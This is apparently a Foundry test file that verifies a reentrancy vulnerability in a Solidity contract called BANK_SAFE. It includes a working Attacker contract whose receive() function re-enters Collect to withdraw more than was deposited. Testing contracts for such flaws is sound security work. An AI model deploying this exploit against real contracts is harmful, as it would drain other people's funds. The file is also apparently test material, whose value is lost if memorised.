
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {BANK_SAFE} from "../src/BANK_SAFE.sol";
import {LogFile} from "../src/LogFile.sol";

contract TestReentrancyBANK_SAFE is Test {
    BANK_SAFE public _contractUnderTest;
    LogFile public _logFile;
    Attacker public _attacker;

    function setUp() public {
        _logFile = new LogFile();
        _contractUnderTest = new BANK_SAFE();
        
        _contractUnderTest.SetMinSum(0);
        _contractUnderTest.SetLogFile(address(_logFile));
        _contractUnderTest.Initialized();
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0 && attackVal <= type(uint128).max);
        vm.assume(attackVal <= address(this).balance / 2);

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    BANK_SAFE public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public attackValue;
    uint256 public initialBalance;

    constructor(address victimAddress) { 
        victim = BANK_SAFE(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        attackValue = val;
        
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        attackValue = val;
        initialBalance = address(this).balance;
        
        victim.Collect(val);
        
        if (attackCallCount > 1 && address(this).balance > initialBalance + val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            victim.Collect(attackValue);
        }
    }
}
